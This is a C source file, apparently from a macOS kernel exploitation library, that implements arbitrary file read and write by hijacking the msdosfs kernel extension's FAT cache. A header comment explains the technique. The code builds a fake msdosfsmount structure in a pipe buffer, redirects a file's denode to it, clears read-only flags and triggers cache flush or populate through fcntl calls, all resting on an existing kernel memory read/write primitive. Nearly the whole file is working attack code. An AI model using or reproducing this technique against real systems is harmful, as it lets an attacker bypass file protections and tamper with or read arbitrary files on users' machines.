//
//  vnode.c
//  libxe
//
//  Created by sreejith on 3/10/22.
//

#include <limits.h>

#include <sys/fcntl.h>
#include <sys/mount.h>

#include "util/vnode.h"
#include "util/pipe.h"
#include "util/msdosfs.h"
#include "util/log.h"
#include "util/assert.h"
#include "util/misc.h"
#include "memory/kmem.h"
#include "memory/kmem_fast.h"
#include "allocator/small_mem.h"
#include "slider/kernel.h"
#include "xnu/proc.h"

#include "../external/msdosfs/msdosfs.h"

///
/// The `msdosfs.kext` kernel extension is used for mounting MS-DOS filesystems in macOS.
/// This file system uses File Allocation Table (FAT) to identify clusters associated with a file. The
/// FAT is a statically allocated linked list allocated at the time of formatting. Each entry in this
/// linked list contains either the number of the next cluster in the file, or else a marker indicating
/// the end of the file, unused disk space, or special reserved areas of the disk[1]. The directory
/// containing a file will store the first cluster of each file in that directory. The remaining storage
/// associated with a particular file can then be identified by traversing the FAT linked list.
///
/// While mounting a MS-DOS filesystem, the `msdosfs.kext` creates a vnode pointing to the
/// statically allocated storage used by the FAT. Then it uses cluster I/O to read / write data
/// from / to the FAT. The reference to this vnode is stored in the member `pm_fat_active_vp` of
/// the `struct msdosfsmount`. To optimize performance, the most recently used FAT block is also
/// cached in the kernel memory pointed by `msdosfsmount->pm_fat_cache`. Whenever a new
/// FAT block is required to be read, it is first read into the `pm_fat_cache` before being used
/// by the kext. Also modifications to FAT block are first done on the `pm_fat_cache` and then
/// the cache is flushed to vnode `pm_fat_active_vp`. The method `msdosfs_fat_cache_flush`
/// defined in `msdosfs_fat.c` is responsible for writing the data from cache to vnode and the
/// method `msdosfs_fat_map` is used to read a FAT block from vnode to cache.
///
/// This mechanism used by `msdosfs.kext` can be exploited to read / write data from / to any
/// arbitary vnode by replacing the value of `pm_fat_active_vp`. To write data of length `length`
/// from kernel memory location `source` to a arbitary vnode `target_vp`, we set the value of
/// members `pm_fat_active_vp` to `target_vp`, `pm_fat_cache` to `source` and `pm_fat_bytes`
/// to `length` and then trigger the method `msdosfs_fat_cache_flush`. The method
/// `msdosfs_fat_cache_flush` can be triggered from userland by performing `F_FLUSH_DATA`
/// fcntl on a file inside the msdosfs mount. Similarly, to read data of length `length` from arbitary
/// vnode `target_vp` to kernel memory location `destination`, we will set the values of
/// `pm_fat_active_vp` to `target_vp`, `pm_fat_cache` to `destination` and `pm_fat_bytes` to
/// `length`. Then we will trigger the method `msdosfs_fat_map` from userland by performing a
/// `F_LOG2PHYS_EXT` fcntl on a file inside the msdosfs mount.
///
/// References:
/// [ 1 ] https://en.wikipedia.org/wiki/File_Allocation_Table
///


struct xpl_vnode {
    xpl_msdosfs_t msdosfs_util;
    int cctl_fd;
    uintptr_t msdosfs_mount;
    uintptr_t cctl_denode;
    xpl_pipe_t fake_mount_pipe;
    char msdosfs_mount_backup[TYPE_MSDOSFSMOUNT_SIZE];
};


xpl_msdosfs_t xpl_vnode_init_vol(void) {
    xpl_msdosfs_t vol = xpl_msdosfs_mount(64, MNT_DONTBROWSE | MNT_DEFWRITE | MNT_ASYNC);
    
    char mount[sizeof(XPL_MOUNT_TEMP_DIR)];
    xpl_msdosfs_mount_point(vol, mount);
    
    char cctl_file[PATH_MAX];
    snprintf(cctl_file, sizeof(cctl_file), "%s/cctl", mount);
    
    int fd = open(cctl_file, O_CREAT | O_RDWR, S_IRWXU);
    xpl_assert_errno(fd < 0);
    
    /// Increase file size so that start cluster of cctl file will not be `MSDOSFSROOT`
    int res = ftruncate(fd, 1024);
    xpl_assert_errno(res);
    
    close(fd);
    xpl_msdosfs_update(vol, MNT_DONTBROWSE | MNT_RDONLY);
    
    return vol;
}


xpl_vnode_t xpl_vnode_create(void) {
    xpl_msdosfs_t msdosfs_util = xpl_vnode_init_vol();
    
    char mount_point[sizeof(XPL_MOUNT_TEMP_DIR)];
    xpl_msdosfs_mount_point(msdosfs_util, mount_point);
    
    uintptr_t proc = xpl_proc_current_proc();
    
    int mount_fd = xpl_msdosfs_mount_fd(msdosfs_util);
    uintptr_t mount_vnode;
    int error = xpl_proc_find_fd_data(proc, mount_fd, &mount_vnode);
    xpl_assert_err(error);
    uintptr_t mount = xpl_kmem_read_ptr(mount_vnode, TYPE_VNODE_MEM_VN_UN_OFFSET);
    uintptr_t msdosfs_mount = xpl_kmem_read_ptr(mount, TYPE_MOUNT_MEM_MNT_DATA_OFFSET);
    
    char buffer[PATH_MAX];
    snprintf(buffer, sizeof(buffer), "%s/cctl", mount_point);
    
    /// The file inside msdosfs mount that we will use to populate / flush FAT cache
    int cctl_fd = open(buffer, O_RDONLY);
    xpl_assert(cctl_fd >= 0);
    
    uintptr_t cctl_vnode;
    error = xpl_proc_find_fd_data(proc, cctl_fd, &cctl_vnode);
    xpl_assert_err(error);
    uintptr_t cctl_dep = xpl_kmem_read_ptr(cctl_vnode, TYPE_VNODE_MEM_VN_DATA_OFFSET);
    xpl_assert_cond(xpl_kmem_read_uint64(cctl_dep, TYPE_DENODE_MEM_DE_PMP_OFFSET), ==, msdosfs_mount);
    
    xpl_vnode_t util = malloc(sizeof(struct xpl_vnode));
    util->msdosfs_util = msdosfs_util;
    util->cctl_fd = cctl_fd;
    util->msdosfs_mount = msdosfs_mount;
    util->cctl_denode = cctl_dep;
    util->fake_mount_pipe = xpl_pipe_create(TYPE_MSDOSFSMOUNT_SIZE);
    
    xpl_kmem_read(util->msdosfs_mount_backup, msdosfs_mount, 0, sizeof(util->msdosfs_mount_backup));
    xpl_pipe_write(util->fake_mount_pipe, util->msdosfs_mount_backup, sizeof(util->msdosfs_mount_backup));
    
    /// Instead of directly changing the actual `struct msdosfsmount`, we will create a fake
    /// `struct msdosfsmount` and assign it to `denode->de_pmp` of the `cctl_fd`.
    /// This will only make FS operations on `cctl_fd` to use this fake mount. This is done to
    /// prevent the background thread `pm_sync_timer` started by `msdosfs.kext` when the file
    /// system is mounted, from interfering with the changed FAT vnode and cache
    ///
    /// NOTE: keep this kmem write at the end because this module is used to create
    /// `kmem_fast` and the boostrap kmem implementation used to create `kmem_fast`
    /// might prefer all write ops performed after read (eg: `xpl_kmem/kmem_boostrap.c`)
    xpl_kmem_write_uint64(cctl_dep, TYPE_DENODE_MEM_DE_PMP_OFFSET, xpl_pipe_get_address(util->fake_mount_pipe));
    
    return util;
}

void xpl_vnode_flush_cache(xpl_vnode_t util) {
    /// Trigger `msdosfs_fat_cache_flush`
    int error = fcntl(util->cctl_fd, F_FLUSH_DATA);
    xpl_assert_err(error);
}

void xpl_vnode_populate_cache(xpl_vnode_t util) {
    /// Trigger `msdosfs_fat_map`
    struct log2phys args;
    bzero(&args, sizeof(args));
    args.l2p_contigbytes = 16384;
    args.l2p_devoffset = 16384;
    int res = fcntl(util->cctl_fd, F_LOG2PHYS_EXT, &args);
    xpl_assert_cond(res, ==, -1);
    xpl_assert(errno == EIO || errno == E2BIG);
}

void xpl_vnode_read_kernel(xpl_vnode_t util, uintptr_t vnode, uintptr_t dst, size_t size) {
    char mount[TYPE_MSDOSFSMOUNT_SIZE];
    memcpy(mount, util->msdosfs_mount_backup, sizeof(mount));
    
    uint64_t* pm_fat_cache = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET);
    uint32_t* pm_fat_cache_offset = (uint32_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET_OFFSET);
    int* pm_fat_flags = (int*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_FLAGS_OFFSET);
    uint* pm_fatmult = (uint*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FATMULT);
    uint32_t* pm_block_size = (uint32_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_BLOCK_SIZE_OFFSET);
    uint32_t* pm_fat_bytes = (uint32_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_BYTES_OFFSET);
    uint64_t* pm_fat_active_vp = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_ACTIVE_VP_OFFSET);
    
    /// Location in kernel memory for storing data read from vnode
    *pm_fat_cache = dst;
    /// Required for populating FAT cache
    *pm_fat_cache_offset = INT32_MAX;
    /// Amount of data to be read from vnode
    *pm_block_size = (uint32_t)size;
    *pm_fat_bytes = (uint32_t)size;
    /// This will make the offset used in `uio_create` to 0, which will allow us to read from the
    /// beginning of vnode
    *pm_fatmult = 0;
    /// Make sure FAT cache is not marked dirty, or else data will first be written
    /// from kernel memory to vnode before FAT cache is populated
    *pm_fat_flags = 0;
    /// Vnode from which data is to be read
    *pm_fat_active_vp = vnode;
    
    /// Update fake_mount associated to `cctl_fd`
    xpl_pipe_write(util->fake_mount_pipe, mount, sizeof(mount));
    
    /// Use `cctl_fd` to trigger FAT cache populate
    xpl_vnode_populate_cache(util);
}

void xpl_vnode_read_user(xpl_vnode_t util, uintptr_t vnode, char* dst, size_t size) {
    xpl_assert_cond(size, <=, UINT32_MAX);
    /// Temporary storage for `dst` data in kernel memory
    uintptr_t buffer;
    xpl_allocator_small_mem_t buffer_alloc = xpl_allocator_small_mem_allocate(size, &buffer);
    xpl_vnode_read_kernel(util, vnode, buffer, size);
    /// Read the vnode data from kernel memory to `dst`
    xpl_kmem_read(dst, buffer, 0, size);
    xpl_allocator_small_mem_destroy(&buffer_alloc);
}

void xpl_vnode_write_kernel(xpl_vnode_t util, uintptr_t vnode, uintptr_t src, size_t size) {
    char mount[TYPE_MSDOSFSMOUNT_SIZE];
    memcpy(mount, util->msdosfs_mount_backup, sizeof(mount));
    
    uint64_t* pm_fat_cache = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET);
    uint32_t* pm_fat_cache_offset = (uint32_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET_OFFSET);
    uint* pm_flags = (uint*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FLAGS_OFFSET);
    int* pm_fat_flags = (int*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_FLAGS_OFFSET);
    uint32_t* pm_block_size = (uint32_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_BLOCK_SIZE_OFFSET);
    uint32_t* pm_fat_bytes = (uint32_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_BYTES_OFFSET);
    uint64_t* pm_fat_active_vp = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_ACTIVE_VP_OFFSET);
    uint64_t* pm_sync_timer = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_SYNC_TIMER);
    
    /// Location in kernel memory containing data to be written
    *pm_fat_cache = src;
    /// Make sure we start writing from the start of vnode
    *pm_fat_cache_offset = 0;
    /// Write data size
    *pm_block_size = (uint32_t)size;
    *pm_fat_bytes = (uint32_t)size;
    /// Destination vnode
    *pm_fat_active_vp = vnode;
    /// Disable read only flags, if mounted with read only
    *pm_flags &= (~(MSDOSFSMNT_RONLY | MSDOSFS_FATMIRROR));
    /// mark FAT cache dirty
    *pm_fat_flags = 1;
    /// Required to bypass check in `msdosfs_meta_flush`, so that method
    /// `msdosfs_meta_flush_internal` will be called
    *pm_sync_timer = 0;
    
    xpl_pipe_write(util->fake_mount_pipe, mount, sizeof(mount));
    xpl_vnode_flush_cache(util);
}

void xpl_vnode_write_user(xpl_vnode_t util, uintptr_t vnode, const char* src, size_t size) {
    /// Copy `src` data from user land to kernel memory
    uintptr_t buffer;
    xpl_allocator_small_mem_t buffer_alloc = xpl_allocator_small_mem_allocate(size, &buffer);
    xpl_kmem_write(buffer, 0, (void*)src, size);
    xpl_vnode_write_kernel(util, vnode, buffer, size);
    xpl_allocator_small_mem_destroy(&buffer_alloc);
}

void xpl_vnode_destroy(xpl_vnode_t* util_p) {
    xpl_vnode_t util = *util_p;
    xpl_kmem_write_uint64(util->cctl_denode, TYPE_DENODE_MEM_DE_PMP_OFFSET, util->msdosfs_mount);
    close(util->cctl_fd);
    xpl_msdosfs_unmount(&util->msdosfs_util);
    xpl_pipe_destroy(&util->fake_mount_pipe);
    free(util);
    *util_p = NULL;
}
